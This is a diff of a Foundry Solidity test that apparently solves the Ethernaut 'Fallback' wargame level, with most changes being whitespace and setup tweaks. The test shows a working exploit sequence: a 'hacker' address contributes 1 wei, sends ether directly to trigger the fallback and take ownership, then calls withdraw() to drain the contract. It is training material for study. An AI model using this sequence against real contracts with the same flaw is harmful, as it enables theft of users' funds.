@@ -5,14 +5,16 @@ import "forge-std/Test.sol";
 import {Fallback} from "src/01/Fallback.sol";
 
 contract FallbackTest is Test {
-    Fallback public level;
+
+    Fallback public level = new Fallback();
     address instance = vm.addr(0x1); 
     address hacker = vm.addr(0x2); 
 
     function setUp() public {
+
       vm.deal(hacker, 0.0001 ether);
       vm.prank(instance);
-      level = new Fallback();
+
     }
 
     function testFallbackHack() public {
@@ -27,10 +29,6 @@ contract FallbackTest is Test {
         // Should show the adress of the instance
         //////////////////////////////////////////
         emit log_address(instance);
-
-        ///////////////////////////////////
-        // Should be the same as above
-        ///////////////////////////////////
         emit log_address(level.owner());
 
         ///////////////////////////////////
@@ -48,7 +46,6 @@ contract FallbackTest is Test {
         emit log_address(hacker);
         emit log_uint(hacker.balance);
         
-
         ////////////////////////////////////////
         //                                    //
         //        STEP 2: contribute()        //
@@ -59,6 +56,7 @@ contract FallbackTest is Test {
         // contribute with msg.sender to hacker
         ////////////////////////////////////////
         vm.startPrank(hacker);
+
         level.contribute{value: 1 wei}();
 
         /////////////////////////////////// 
@@ -67,7 +65,6 @@ contract FallbackTest is Test {
         ///////////////////////////////////
         emit log_uint(hacker.balance);
         emit log_uint(level.getContribution());
-
 
         ////////////////////////////////////////
         //                                    //
@@ -81,8 +78,8 @@ contract FallbackTest is Test {
         /////////////////////////////////////
         (bool sent, ) = address(level).call{value: 1 wei}("");
         require(sent, "Failed to call send()");
+
         assertEq(level.owner(), hacker);
-        
 
         ////////////////////////////////////////
         //                                    //
@@ -90,6 +87,7 @@ contract FallbackTest is Test {
         //                                    //
         ////////////////////////////////////////
         level.withdraw();
+
         vm.stopPrank();
 
       }
